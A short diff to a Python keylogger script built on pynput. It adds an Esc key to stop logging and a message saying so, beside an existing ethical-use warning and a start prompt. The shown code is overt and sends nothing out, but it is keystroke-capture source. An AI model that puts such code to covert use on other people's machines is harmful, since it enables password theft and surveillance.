@@ -22,6 +22,8 @@ def write_to_file(key):
             letter = '<shift>'
         elif key in {Key.ctrl, Key.ctrl_l, Key.ctrl_r}:
             letter = '<ctrl>'
+        elif key == Key.esc:
+            return False
         else:
             # Handle function keys and other non-character keys
             letter = f'<{letter}>'
@@ -34,6 +36,7 @@ def main():
     print("Security Considerations:")
     print("Remember to use this keylogger ethically and legally, only in situations where you have explicit permission.")
     input("Press Enter to start logging keystrokes...")
+    print("Press 'Esc' key to stop the program and end logging.")
 
     with Listener(on_press= write_to_file) as listen:
         listen.join()
